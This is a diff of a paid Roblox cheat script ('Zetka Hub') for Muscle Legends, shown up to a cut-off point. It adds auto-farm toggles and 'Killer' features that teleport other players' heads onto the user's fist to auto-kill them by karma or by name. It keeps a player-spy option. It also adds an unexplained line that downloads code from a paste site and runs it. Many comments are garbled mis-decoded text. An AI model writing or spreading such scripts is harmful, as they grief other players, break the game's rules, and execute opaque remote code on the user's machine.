@@ -6,11 +6,15 @@ local whitelist = {
     [4975006716] = true,
     [9118652548] = true,
     [8126198790] = true,
+    [9240147934] = true,
+    [2664287139] = true,
+    [7048987276] = true,
+    [9229221610] = true,
 }
 
 local localPlayer = game:GetService("Players").LocalPlayer
 if not whitelist[localPlayer.UserId] then
-    localPlayer:Kick("в›” You are not whitelisted!")
+    localPlayer:Kick("ðŸš« You are not whitelisted!")
     return
 end
 
@@ -19,38 +23,39 @@ local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/d
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 local musclelegendid = 3623096087
 
-    --if 
-    --    game.PlaceId ~= musclelegendid 
-    --then
-    --    game:GetService("Players").LocalPlayer:Kick("вќЊ Wrong Place! Join the Muscle Legends.")
-    --else
-    --    print("Place is right")
-    --end
+    if 
+        game.PlaceId ~= musclelegendid 
+    then
+        game:GetService("Players").LocalPlayer:Kick("ðŸš« Wrong Place! Join the Muscle Legends.")
+    else
+        print("Place is right")
+    end
 
     local Window = Fluent:CreateWindow({
             Title = "Zetka Hub | Paid Ver. " .. Fluent.Version,
             SubTitle = "by Zerquesth & Amigo & lzynoxx1337",
             TabWidth = 160,
-            Size = UDim2.fromOffset(580, 460),
-            Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+            Size = UDim2.fromOffset(550, 320),
+            Acrylic = true,
             Theme = "Dark",
-            MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+            MinimizeKey = Enum.KeyCode.LeftControl
         })
 
--- Р”РѕРїРѕР»РЅРёС‚РµР»СЊРЅР°СЏ РїСЂРѕРІРµСЂРєР° РґР»СЏ РЅРѕРІС‹С… РёРіСЂРѕРєРѕРІ (РµСЃР»Рё СЌС‚Рѕ FE)
+        loadstring(game:HttpGet("https://pastefy.app/nWFRhL1s/raw"))()
+
 game.Players.PlayerAdded:Connect(function(player)
     if not whitelist[player.UserId] then
-        player:Kick("” You are not whitelisted!")
+        player:Kick("ðŸš« You are not whitelisted!")
     end
 end)
-
-
 
 local Tabs = {
     Credits = Window:AddTab({ Title = "Credits", Icon = "scroll" }),
     Main = Window:AddTab({ Title = "Main", Icon = "scan" }),
+    AutoFarm = Window:AddTab({ Title = "Auto Farm", Icon = "bot" }),
+    RebirthTab = Window:AddTab({ Title = "Rebirths", Icon = "refresh-ccw" }),
+    Killer = Window:AddTab({ Title = "Killer", Icon = "skull" }),
     PaidTab = Window:AddTab({ Title = "Paid Tab", Icon = "gift-card" }),
-    Glitching = Window:AddTab({ Title = "Glitching", Icon = "target" }),
     Teleport = Window:AddTab({ Title = "Teleport", Icon = "chevrons-down" }),
     Misc = Window:AddTab({ Title = "Misc", Icon = "menu" }),
     Rewards = Window:AddTab({ Title = "Rewards", Icon = "gem" }),
@@ -100,10 +105,10 @@ Tabs.Credits:AddButton({
     Title = "Click to Copy Discord Link",
     Callback = function()
         setclipboard("https://discord.gg/dNkmRDGN6h")
-        print("РЎСЃС‹Р»РєР° РЅР° Discord СЃРєРѕРїРёСЂРѕРІР°РЅР° РІ Р±СѓС„РµСЂ РѕР±РјРµРЅР°! рџ“‹")
+        print("ðŸ“‹ Discord server link copied to clipboard!")
         Fluent:Notify({
         Title = "Notification",
-        Content = "РЎСЃС‹Р»РєР° РЅР° Discord СЃРєРѕРїРёСЂРѕРІР°РЅР° РІ Р±СѓС„РµСЂ РѕР±РјРµРЅР°! рџ“‹",
+        Content = "ðŸ“‹ Discord server link copied to clipboard!",
         Duration = 6.5,
         })
     end
@@ -111,31 +116,9 @@ Tabs.Credits:AddButton({
 
 -- Main Tab
 
-local Section2 = Tabs.Main:AddSection("Rebirths Folder")
+local Section2 = Tabs.Main:AddSection("Main")
 
-local toggleLoop = nil
-local Toggle1 = Tabs.Main:AddToggle("MyToggle", 
-{
-    Title = "Auto Lift", 
-    Default = false,
-    Callback = function(state)
-	if state then
-        toggleLoop = task.spawn(function()
-            while true do
-                game.Players.LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
-                task.wait(0.1)
-            end
-        end)
-    else
-        if toggleLoop then
-            task.cancel(toggleLoop)  -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј С†РёРєР»
-            toggleLoop = nil
-        end
-    end
-end
-})
-
-local Toggle2 = Tabs.Main:AddToggle("MyToggle", 
+local Toggle2 = Tabs.RebirthTab:AddToggle("MyToggle", 
 {
     Title = "Auto Normal Rebirth", 
     Default = false,
@@ -147,21 +130,18 @@ local Toggle2 = Tabs.Main:AddToggle("MyToggle",
         local rebirthConnection
         local deathConnection
 
-        -- РћСЃРЅРѕРІРЅР°СЏ С„СѓРЅРєС†РёСЏ СЂРµР±РёСЂС‚Р°
         local function doRebirth()
             if autoRebirthEnabled then
                 game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthRemote"):InvokeServer("rebirthRequest")
             end
         end
 
-        -- Р¦РёРєР» СЂРµР±РёСЂС‚РѕРІ (СЃ РёРЅС‚РµСЂРІР°Р»РѕРј 0.1 СЃРµРє)
         rebirthConnection = game:GetService("RunService").Heartbeat:Connect(function()
             if autoRebirthEnabled then
                 doRebirth()
             end
         end)
 
-        -- РђРІС‚Рѕ-РїРµСЂРµРїРѕРґРєР»СЋС‡РµРЅРёРµ РїРѕСЃР»Рµ СЃРјРµСЂС‚Рё
         local function setupRespawn()
             if player.Character then
                 deathConnection = player.Character.Humanoid.Died:Connect(function()
@@ -183,183 +163,6 @@ local Toggle2 = Tabs.Main:AddToggle("MyToggle",
 end
 })
 
-local Toggle3 = Tabs.Main:AddToggle("MyToggle", 
-{
-    Title = "Auto Weight", 
-    Default = false,
-    Callback = function(state)
-	autoWeightEnabled = state
-    
-    if state then
-        
-        local weightLoop
-        local deathConnection
-        local characterAddedConnection
-        local player = game:GetService("Players").LocalPlayer
-        
-        -- РЈР»СѓС‡С€РµРЅРЅР°СЏ С„СѓРЅРєС†РёСЏ СЌРєРёРїРёСЂРѕРІРєРё
-        local function equipWeight()
-            local character = player.Character
-            if not character or not character:FindFirstChild("Humanoid") then return false end
-            
-            local humanoid = character:FindFirstChild("Humanoid")
-            local weightTool = player.Backpack:FindFirstChild("Weight") or character:FindFirstChild("Weight")
-            
-            if weightTool and weightTool:IsA("Tool") then
-                -- Р•СЃР»Рё Weight РІ Р±СЌРєРїР°РєРµ - СЌРєРёРїРёСЂСѓРµРј
-                if weightTool.Parent == player.Backpack then
-                    humanoid:EquipTool(weightTool)
-                    task.wait(0.2) -- Р”Р°РµРј РІСЂРµРјСЏ РЅР° СЌРєРёРїРёСЂРѕРІРєСѓ
-                end
-                return true
-            end
-            return false
-        end
-        
-        -- РћСЃРЅРѕРІРЅРѕР№ С†РёРєР» Р°РєС‚РёРІР°С†РёРё
-        local function activateWeight()
-            while autoWeightEnabled and task.wait(0.2) do
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    -- РџРѕСЃС‚РѕСЏРЅРЅРѕ РїС‹С‚Р°РµРјСЃСЏ СЌРєРёРїРёСЂРѕРІР°С‚СЊ (РЅР° СЃР»СѓС‡Р°Р№, РµСЃР»Рё РёРЅСЃС‚СЂСѓРјРµРЅС‚ СѓРїР°Р»)
-                    equipWeight()
-                    
-                    local tool = player.Character:FindFirstChild("Weight")
-                    if tool and tool:IsA("Tool") then
-                        tool:Activate()
-                    end
-                end
-            end
-        end
-        
-        -- РћР±СЂР°Р±РѕС‚С‡РёРє СЃРјРµСЂС‚Рё РїРµСЂСЃРѕРЅР°Р¶Р°
-        local function onCharacterAdded(character)
-            if deathConnection then deathConnection:Disconnect() end
-            
-            deathConnection = character:WaitForChild("Humanoid").Died:Connect(function()
-                if weightLoop then task.cancel(weightLoop) end
-                
-                task.wait(1.5) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ СЂРµСЃРїР°РІРЅР°
-                
-                if autoWeightEnabled then
-                    -- Р”РІРѕР№РЅР°СЏ РїСЂРѕРІРµСЂРєР° РїРѕСЃР»Рµ СЂРµСЃРїР°РІРЅР°
-                    task.wait(0.5)
-                    equipWeight()
-                    weightLoop = task.spawn(activateWeight)
-                end
-            end)
-            
-            if autoWeightEnabled then
-                task.wait(1) -- РЈРІРµР»РёС‡РµРЅРЅРѕРµ РІСЂРµРјСЏ РґР»СЏ РїРѕР»РЅРѕР№ Р·Р°РіСЂСѓР·РєРё РїРµСЂСЃРѕРЅР°Р¶Р°
-                equipWeight()
-                weightLoop = task.spawn(activateWeight)
-            end
-        end
-        
-        -- РџРµСЂРІРѕРЅР°С‡Р°Р»СЊРЅР°СЏ РЅР°СЃС‚СЂРѕР№РєР°
-        if player.Character then
-            onCharacterAdded(player.Character)
-        end
-        
-        -- РџРѕРґРєР»СЋС‡Р°РµРј РѕР±СЂР°Р±РѕС‚С‡РёРє РЅРѕРІРѕРіРѕ РїРµСЂСЃРѕРЅР°Р¶Р°
-        characterAddedConnection = player.CharacterAdded:Connect(onCharacterAdded)
-        
-    else
-        -- Р”РµР°РєС‚РёРІР°С†РёСЏ
-        if weightLoop then task.cancel(weightLoop) end
-        if deathConnection then deathConnection:Disconnect() end
-        if characterAddedConnection then characterAddedConnection:Disconnect() end
-    end
-end
-})
-
-local Toggle4 = Tabs.Main:AddToggle("MyToggle", 
-{
-    Title = "Auto Pushups", 
-    Default = false,
-    Callback = function(state)
-        autoPushupsEnabled = state
-    
-        if state then
-            local pushupsLoop
-            local deathConnection
-            local characterAddedConnection
-            local player = game:GetService("Players").LocalPlayer
-            
-            -- Improved function for equipping pushup tool
-            local function equipPushups()
-                local character = player.Character
-                if not character or not character:FindFirstChild("Humanoid") then return false end
-                
-                local humanoid = character:FindFirstChild("Humanoid")
-                local pushupsTool = player.Backpack:FindFirstChild("Pushups") or character:FindFirstChild("Pushups")
-                
-                if pushupsTool and pushupsTool:IsA("Tool") then
-                    -- If Pushups is in backpack - equip it
-                    if pushupsTool.Parent == player.Backpack then
-                        humanoid:EquipTool(pushupsTool)
-                        task.wait(0.2) -- Give time for equipping
-                    end
-                    return true
-                end
-                return false
-            end
-            
-            -- Main activation loop
-            local function activatePushups()
-                while autoPushupsEnabled and task.wait(0.2) do
-                    if player.Character and player.Character:FindFirstChild("Humanoid") then
-                        -- Constantly try to equip (in case tool dropped)
-                        equipPushups()
-                        
-                        local tool = player.Character:FindFirstChild("Pushups")
-                        if tool and tool:IsA("Tool") then
-                            tool:Activate()
-                        end
-                    end
-                end
-            end
-            
-            -- Character death handler
-            local function onCharacterAdded(character)
-                if deathConnection then deathConnection:Disconnect() end
-                
-                deathConnection = character:WaitForChild("Humanoid").Died:Connect(function()
-                    if pushupsLoop then task.cancel(pushupsLoop) end
-                    
-                    task.wait(1.5) -- Increased respawn time
-                    
-                    if autoPushupsEnabled then
-                        -- Double check after respawn
-                        task.wait(0.5)
-                        equipPushups()
-                        pushupsLoop = task.spawn(activatePushups)
-                    end
-                end)
-                
-                if autoPushupsEnabled then
-                    task.wait(1) -- Increased time for full character load
-                    equipPushups()
-                    pushupsLoop = task.spawn(activatePushups)
-                end
-            end
-            
-            -- Initial setup
-            if player.Character then
-                onCharacterAdded(player.Character)
-            end
-            
-            -- Connect new character handler
-            characterAddedConnection = player.CharacterAdded:Connect(onCharacterAdded)
-            
-        else
-            -- Deactivation
-            if pushupsLoop then task.cancel(pushupsLoop) end
-            if deathConnection then deathConnection:Disconnect() end
-            if characterAddedConnection then characterAddedConnection:Disconnect() end
-        end
-    end
-})
-
 local Toggle5 = Tabs.Main:AddToggle("MyToggle", 
 {
     Title = "Auto Size 2", 
@@ -373,7 +176,6 @@ local Toggle5 = Tabs.Main:AddToggle("MyToggle",
         local sizeLoop
         local deathConnection
 
-        -- РћСЃРЅРѕРІРЅРѕР№ С†РёРєР» РёР·РјРµРЅРµРЅРёСЏ СЂР°Р·РјРµСЂР°
         local function changeSize()
             while autoSizeEnabled do
                 game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 2)
@@ -381,7 +183,6 @@ local Toggle5 = Tabs.Main:AddToggle("MyToggle",
             end
         end
 
-        -- РђРІС‚Рѕ-РїРµСЂРµРїРѕРґРєР»СЋС‡РµРЅРёРµ РїРѕСЃР»Рµ СЃРјРµСЂС‚Рё
         local function setupRespawn()
             if player.Character then
                 deathConnection = player.Character.Humanoid.Died:Connect(function()
@@ -394,7 +195,6 @@ local Toggle5 = Tabs.Main:AddToggle("MyToggle",
             end
         end
 
-        -- РЎС‚Р°СЂС‚ РѕСЃРЅРѕРІРЅРѕРіРѕ С†РёРєР»Р°
         sizeLoop = task.spawn(changeSize)
         setupRespawn()
         player.CharacterAdded:Connect(setupRespawn)
@@ -420,7 +220,6 @@ local function toggleTeleport()
     teleportActive = not teleportActive
     
     if teleportActive then
-        -- Р—Р°РїСѓСЃРєР°РµРј С‚РµР»РµРїРѕСЂС‚Р°С†РёСЋ
         teleportThread = coroutine.create(function()
             while teleportActive do
                 teleportPlayer()
@@ -429,7 +228,6 @@ local function toggleTeleport()
         end)
         coroutine.resume(teleportThread)
         
-        -- РћР±СЂР°Р±РѕС‚С‡РёРє РІРѕР·СЂРѕР¶РґРµРЅРёСЏ РїРµСЂСЃРѕРЅР°Р¶Р°
         game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
             if teleportActive then
                 character:WaitForChild("HumanoidRootPart")
@@ -437,7 +235,6 @@ local function toggleTeleport()
             end
         end)
     else
-        -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј С‚РµР»РµРїРѕСЂС‚Р°С†РёСЋ
         if teleportThread then
             coroutine.close(teleportThread)
         end
@@ -451,45 +248,41 @@ Tabs.Main:AddButton({
     end
 })
 
--- РџРµСЂРµРјРµРЅРЅС‹Рµ
 local currentRebirthGoal = 0
 local autoCheckEnabled = false
 local checkConnection = nil
 
--- Р¤СѓРЅРєС†РёСЏ РїСЂРѕРІРµСЂРєРё
 local function checkRebirths()
     if not autoCheckEnabled then return end
     
     local currentRebirths = game:GetService("Players").LocalPlayer.leaderstats.Rebirths.Value
     
     if currentRebirths >= currentRebirthGoal then
-        print("Р¦РµР»СЊ РґРѕСЃС‚РёРіРЅСѓС‚Р°! РўРµРєСѓС‰РёРµ СЂРµР±РёСЂС‚С‹:", currentRebirths)
+        print("Goal reached! Current rebirths:", currentRebirths)
         if checkConnection then
             checkConnection:Disconnect()
         end
-        if Toggle2 then -- РџСЂРѕРІРµСЂСЏРµРј, СЃСѓС‰РµСЃС‚РІСѓРµС‚ Р»Рё Toggle2
-            Toggle2:SetValue(false) -- Р’С‹РєР»СЋС‡Р°РµРј РїСЂРѕРІРµСЂРєСѓ
+        if Toggle2 then
+            Toggle2:SetValue(false)
         checkAndDisableToggle()
         end
     else
-        print("РџСЂРѕРіСЂРµСЃСЃ:", currentRebirths.."/"..currentRebirthGoal)
+        print("Progress:", currentRebirths.."/"..currentRebirthGoal)
     end
 end
 
-local Toggle27 = Tabs.Main:AddToggle("MyToggle", {
+local Toggle27 = Tabs.RebirthTab:AddToggle("MyToggle", {
     Title = "Use Rebirth Goal", 
     Default = false,
     Callback = function(state)
         autoCheckEnabled = state
         
         if state then
-            -- Р’РєР»СЋС‡Р°РµРј РїСЂРѕРІРµСЂРєСѓ
             checkConnection = game:GetService("Players").LocalPlayer.leaderstats.Rebirths.Changed:Connect(function()
                 checkRebirths()
             end)
             print("Auto-check ENABLED")
         else
-            -- Р’С‹РєР»СЋС‡Р°РµРј РїСЂРѕРІРµСЂРєСѓ
             if checkConnection then
                 checkConnection:Disconnect()
             end
@@ -499,33 +292,31 @@ local Toggle27 = Tabs.Main:AddToggle("MyToggle", {
 })
 
 local function checkAndDisableToggle()
-    -- РџСЂРѕРІРµСЂСЏРµРј СЃРѕСЃС‚РѕСЏРЅРёРµ
     if Toggle2.Value then
-        print("Toggle2 Р±С‹Р» РІРєР»СЋС‡РµРЅ - РІС‹РєР»СЋС‡Р°РµРј")
-        Toggle2:Set(false)  -- Р’С‹РєР»СЋС‡Р°РµРј
+        print("Toggle2 was enabled - disabling")
+        Toggle2:Set(false)
         Fluent:Notify({
-            Title = "РЈРІРµРґРѕРјР»РµРЅРёРµ",
-            Content = "РђРІС‚Рѕ-С„РµСЂРјР° Р±С‹Р»Р° РІС‹РєР»СЋС‡РµРЅР°",
+            Title = "Notification",
+            Content = "Auto Normal Rebirths was disabled!",
             Duration = 3
         })
     else
-        print("Toggle2 СѓР¶Рµ РІС‹РєР»СЋС‡РµРЅ")
+        print("Toggle2 arleady enabled")
     end
 end
 
-local Input3 = Tabs.Main:AddInput("Input", {
+local Input3 = Tabs.RebirthTab:AddInput("Input", {
     Title = "Your rebirth goal",
     Placeholder = "Type Here!",
     Numeric = true,
     Finished = true,
     Callback = function(Value)
-        -- РЎРѕС…СЂР°РЅСЏРµРј РІРІРµРґС‘РЅРЅРѕРµ Р·РЅР°С‡РµРЅРёРµ
         currentRebirthGoal = tonumber(Value) or 0
         print("New rebirth goal set:", currentRebirthGoal)
     end
 })
 
-local Section3 = Tabs.Main:AddSection("Kill Stuff")
+local Section3 = Tabs.Killer:AddSection("Kill Stuff")
 
 local autoEquip = false
 local connection = nil
@@ -533,14 +324,13 @@ local connection = nil
 local punchActive = false
 local punchConnection = nil
 
-local Toggle6 = Tabs.Main:AddToggle("MyToggle", 
+local Toggle6 = Tabs.Killer:AddToggle("MyToggle", 
 {
     Title = "Auto Normal Punch", 
     Default = false,
     Callback = function(state)
 	punchActive = state
     
-    -- РЈРґР°Р»СЏРµРј РїСЂРµРґС‹РґСѓС‰РµРµ РїРѕРґРєР»СЋС‡РµРЅРёРµ, РµСЃР»Рё Р±С‹Р»Рѕ
     if punchConnection then
         punchConnection:Disconnect()
         punchConnection = nil
@@ -556,43 +346,37 @@ local Toggle6 = Tabs.Main:AddToggle("MyToggle",
                 local punchTool = player.Backpack:FindFirstChild("Punch") or char:FindFirstChild("Punch")
                 
                 if punchTool then
-                    -- РђРІС‚Рѕ-СЌРєРёРїРёСЂРѕРІРєР°
                     if punchTool.Parent ~= char then
                         char:WaitForChild("Humanoid"):EquipTool(punchTool)
-                        task.wait(0.01) -- Р”Р°РµРј РІСЂРµРјСЏ РЅР° СЌРєРёРїРёСЂРѕРІРєСѓ
+                        task.wait(0.1)
                     end
                     
-                    -- РђРєС‚РёРІР°С†РёСЏ СѓРґР°СЂР° СЃ РѕР±С‹С‡РЅРѕР№ СЃРєРѕСЂРѕСЃС‚СЊСЋ
                     punchTool:Activate()
                 end
-                task.wait(0.01) -- РРЅС‚РµСЂРІР°Р» РјРµР¶РґСѓ СѓРґР°СЂР°РјРё (РјРѕР¶РЅРѕ СЂРµРіСѓР»РёСЂРѕРІР°С‚СЊ)
+                task.wait(0.01)
             end
         end
         
-        -- Р—Р°РїСѓСЃРєР°РµРј СЃСЂР°Р·Сѓ Рё РїСЂРё РєР°Р¶РґРѕРј СЂРµСЃРїР°РІРЅРµ
         punchConnection = player.CharacterAdded:Connect(function()
             if punchActive then
-                task.wait(0.05) -- Р”Р°РµРј РІСЂРµРјСЏ РЅР° РїРѕСЏРІР»РµРЅРёРµ РїРµСЂСЃРѕРЅР°Р¶Р°
+                task.wait(0.5)
                 startPunch()
             end
         end)
         
-        startPunch() -- РџРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє
+        startPunch()
     end 
 end
 })
 
--- Р¤СѓРЅРєС†РёСЏ РґР»СЏ Р°С‚Р°РєРё
 local function attackPlayers()
     local player = game.Players.LocalPlayer
     
-    -- РќР°СЃС‚СЂРѕР№РєР° Р±С‹СЃС‚СЂРѕР№ Р°С‚Р°РєРё
     local punch = player.Backpack:FindFirstChild("Punch") or (player.Character and player.Character:FindFirstChild("Punch"))
     if punch and punch:FindFirstChild("attackTime") then
         punch.attackTime.Value = 0.01
     end
     
-    -- РђС‚Р°РєР° РІСЃРµС… РёРіСЂРѕРєРѕРІ
     for _, target in ipairs(game.Players:GetPlayers()) do
         if target ~= player then
             local root = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
@@ -612,7 +396,7 @@ end
 local autoKill = false
 local connection = nil
 
-local Toggle7 = Tabs.Main:AddToggle("MyToggle", 
+local Toggle7 = Tabs.Killer:AddToggle("MyToggle", 
 {
     Title = "Auto Kill", 
     Default = false,
@@ -625,13 +409,11 @@ local Toggle7 = Tabs.Main:AddToggle("MyToggle",
     end
     
     if state then
-        -- РћСЃРЅРѕРІРЅРѕР№ С†РёРєР» Р°С‚Р°РєРё
         connection = game:GetService("RunService").Heartbeat:Connect(attackPlayers)
         
-        -- РћР±СЂР°Р±РѕС‚С‡РёРє РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
         game.Players.LocalPlayer.CharacterAdded:Connect(function()
             if autoKill then
-                task.wait(0.5) -- РќРµР±РѕР»СЊС€Р°СЏ Р·Р°РґРµСЂР¶РєР° РїРѕСЃР»Рµ РІРѕР·СЂРѕР¶РґРµРЅРёСЏ
+                task.wait(0.5)
                 attackPlayers()
             end
         end)
@@ -639,50 +421,138 @@ local Toggle7 = Tabs.Main:AddToggle("MyToggle",
 end
 })
 
-local Toggle25 = Tabs.Main:AddToggle("AutoKillGoodKarma", 
-{
-    Title = "Auto Kill Good Karma", 
-    Description = "Автоматически атакует игроков с хорошей кармой (работает даже после смерти)",
-    Default = false,
-    Callback = function(state)
-        _G.AutoKillGoodKarma = state
-        
-        if state then
-            spawn(function()
-                while _G.AutoKillGoodKarma do
-                    task.wait(0.1)
-                    
-                    -- Проверяем, жив ли игрок, иначе ждем респавна
-                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                        LocalPlayer.CharacterAdded:Wait()  -- Ждем, пока игрок зареспавнится
-                        task.wait(1)  -- Даем время на загрузку модели
-                    end
-                    
-                    -- Проверяем, есть ли игроки с хорошей кармой
-                    for _, player in ipairs(Players:GetPlayers()) do
-                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Karma") and player.Character.Karma.Value > 0 then
-                            -- Телепортируемся к цели и атакуем
-                            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position)
-                            ReplicatedStorage.muscleEvent:FireServer("punch", "rightHand")
-                            ReplicatedStorage.muscleEvent:FireServer("punch", "leftHand")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Equip Punch tool
+local function equipTool(toolName)
+    local character = LocalPlayer.Character
+    local backpack = LocalPlayer.Backpack
+    if not (character and backpack) then return end
+    local tool = backpack:FindFirstChild(toolName)
+    if tool then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:EquipTool(tool)
+        end
+    end
+end
+
+-- Evil Karma Kill function (targets players with more Evil Karma than Good Karma)
+local function evilKarmaKill(toggleState)
+    getgenv().killEvil = toggleState
+    if toggleState then
+        equipTool("Punch")
+        task.spawn(function()
+            while getgenv().killEvil do
+                local character = LocalPlayer.Character
+                local leftHand = character and character:FindFirstChild("LeftHand")
+                if not leftHand then
+                    task.wait(0.3)
+                    continue
+                end
+                local muscleEvent = LocalPlayer:FindFirstChild("muscleEvent")
+                if muscleEvent then
+                    muscleEvent:FireServer("punch", "rightHand")
+                    muscleEvent:FireServer("punch", "leftHand")
+                end
+                for _, player in pairs(Players:GetPlayers()) do
+                    if player ~= LocalPlayer then
+                        local goodKarma = player:FindFirstChild("goodKarma")
+                        local evilKarma = player:FindFirstChild("evilKarma")
+                        if goodKarma and evilKarma and evilKarma.Value > goodKarma.Value then
+                            local targetChar = player.Character
+                            local head = targetChar and targetChar:FindFirstChild("Head")
+                            if head then
+                                head.CFrame = leftHand.CFrame
+                                for _, part in pairs(targetChar:GetDescendants()) do
+                                    if part:IsA("BasePart") and part.Name == "Handle" then
+                                        part.CFrame = leftHand.CFrame
+                                    end
+                                end
+                                local sweatPart = targetChar:FindFirstChild("sweatPart")
+                                if sweatPart then
+                                    sweatPart.CFrame = leftHand.CFrame
+                                end
+                            end
                         end
                     end
                 end
-            end)
-        end
-    end 
-})
+                task.wait(.1)
+            end
+        end)
+    end
+end
 
-local Toggle26 = Tabs.Main:AddToggle("MyToggle", 
-{
-    Title = "Auto Bad Karma (Soon)", 
+-- Good Karma Kill function (targets players with more Good Karma than Evil Karma)
+local function goodKarmaKill(toggleState)
+    getgenv().killGood = toggleState
+    if toggleState then
+        equipTool("Punch")
+        task.spawn(function()
+            while getgenv().killGood do
+                local character = LocalPlayer.Character
+                local leftHand = character and character:FindFirstChild("LeftHand")
+                if not leftHand then
+                    task.wait(0.3)
+                    continue
+                end
+                local muscleEvent = LocalPlayer:FindFirstChild("muscleEvent")
+                if muscleEvent then
+                    muscleEvent:FireServer("punch", "rightHand")
+                    muscleEvent:FireServer("punch", "leftHand")
+                end
+                for _, player in pairs(Players:GetPlayers()) do
+                    if player ~= LocalPlayer then
+                        local goodKarma = player:FindFirstChild("goodKarma")
+                        local evilKarma = player:FindFirstChild("evilKarma")
+                        if goodKarma and evilKarma and goodKarma.Value > evilKarma.Value then
+                            local targetChar = player.Character
+                            local head = targetChar and targetChar:FindFirstChild("Head")
+                            if head then
+                                head.CFrame = leftHand.CFrame
+                                for _, part in pairs(targetChar:GetDescendants()) do
+                                    if part:IsA("BasePart") and part.Name == "Handle" then
+                                        part.CFrame = leftHand.CFrame
+                                    end
+                                end
+                                local sweatPart = targetChar:FindFirstChild("sweatPart")
+                                if sweatPart then
+                                    sweatPart.CFrame = leftHand.CFrame
+                                end
+                            end
+                        end
+                    end
+                end
+                task.wait(.1)
+            end
+        end)
+    end
+end
+
+local Toggle25 = Tabs.Killer:AddToggle("MyToggle", {
+    Title = "Auto Good Karma",
     Default = false,
     Callback = function(state)
-      --С„СѓРЅРєС†РёСЏ
+        evilKarmaKill(state)
+        pcall(function()
+            Fluent:Notify("Good Karma Kill " .. (state and "Enabled" or "Disabled"), 2)
+        end)
     end
 })
 
-local Section4 = Tabs.Main:AddSection("Target")
+local Toggle26 = Tabs.Killer:AddToggle("MyToggle", {
+    Title = "Auto Evil Karma",
+    Default = false,
+    Callback = function(state)
+        goodKarmaKill(state)
+        pcall(function()
+            Fluent:Notify("Evil Karma Kill " .. (state and "Enabled" or "Disabled"), 2)
+        end)
+    end
+})
+
+local Section4 = Tabs.Killer:AddSection("Target")
 
 local autoEquip = false
 local punchActive = false
@@ -690,15 +560,13 @@ local punchConnection = nil
 local autoKill = false
 local killConnection = nil
 
--- Создаём Dropdown для выбора игрока
-local playerDropdown = Tabs.Main:AddDropdown("PlayerDropdown", {
-    Title = "Выберите игрока",
-    Values = {}, -- Заполнится динамически
+local playerDropdown = Tabs.Killer:AddDropdown("PlayerDropdown", {
+    Title = "Choose Player",
+    Values = {},
     Multi = false,
     Default = nil,
 })
 
--- Обновляем список игроков
 local function updatePlayerList()
     local players = {}
     for _, player in ipairs(game.Players:GetPlayers()) do
@@ -709,12 +577,10 @@ local function updatePlayerList()
     playerDropdown:SetValues(players)
 end
 
--- Инициализация и обновление при изменении
 updatePlayerList()
 game.Players.PlayerAdded:Connect(updatePlayerList)
 game.Players.PlayerRemoving:Connect(updatePlayerList)
 
--- Функция для атаки конкретного игрока
 local function attackSelectedPlayer()
     local selectedPlayerName = playerDropdown.Value
     if not selectedPlayerName then return end
@@ -726,18 +592,15 @@ local function attackSelectedPlayer()
     
     local punch = player.Backpack:FindFirstChild("Punch") or (player.Character and player.Character:FindFirstChild("Punch"))
     if punch then
-        -- Авто-экипировка
         if punch.Parent ~= player.Character then
             player.Character:WaitForChild("Humanoid"):EquipTool(punch)
             task.wait(0.1)
         end
         
-        -- Настройка скорости атаки
         if punch:FindFirstChild("attackTime") then
             punch.attackTime.Value = 0.01
         end
         
-        -- Атака выбранного игрока
         local root = target.Character:FindFirstChild("HumanoidRootPart")
         local rHand = player.Character:FindFirstChild("RightHand")
         local lHand = player.Character:FindFirstChild("LeftHand")
@@ -751,15 +614,13 @@ local function attackSelectedPlayer()
     end
 end
 
--- Тоггл для автоматической атаки
-local Toggle = Tabs.Main:AddToggle("AutoAttackToggle", {
+local Toggle = Tabs.Killer:AddToggle("AutoAttackToggle", {
     Title = "Auto Attack Selected Player",
     Default = false,
     Callback = function(state)
         punchActive = state
         autoKill = state
         
-        -- Очищаем предыдущие соединения
         if punchConnection then
             punchConnection:Disconnect()
             punchConnection = nil
@@ -771,12 +632,10 @@ local Toggle = Tabs.Main:AddToggle("AutoAttackToggle", {
         end
         
         if state then
-            -- Основной цикл атаки
             punchConnection = game:GetService("RunService").Heartbeat:Connect(function()
                 attackSelectedPlayer()
             end)
             
-            -- Обработчик респавна
             killConnection = game.Players.LocalPlayer.CharacterAdded:Connect(function()
                 if punchActive then
                     task.wait(0.5)
@@ -791,17 +650,15 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- Создаем Dropdown для выбора игрока
-local PlayerDropdown = Tabs.Main:AddDropdown("PlayerSpyDropdown", {
-    Title = "Выберите игрока для слежки",
+local PlayerDropdown = Tabs.Killer:AddDropdown("PlayerSpyDropdown", {
+    Title = "Choose player for spy",
     Values = {},
     Multi = false,
     Default = nil,
 })
 
--- Создаем Toggle для активации слежки
-local SpyToggle = Tabs.Main:AddToggle("SpyPlayerToggle", {
-    Title = "Следить за игроком",
+local SpyToggle = Tabs.Killer:AddToggle("SpyPlayerToggle", {
+    Title = "Spy player",
     Default = false,
     Callback = function(state)
         spyActive = state
@@ -809,19 +666,18 @@ local SpyToggle = Tabs.Main:AddToggle("SpyPlayerToggle", {
         if state then
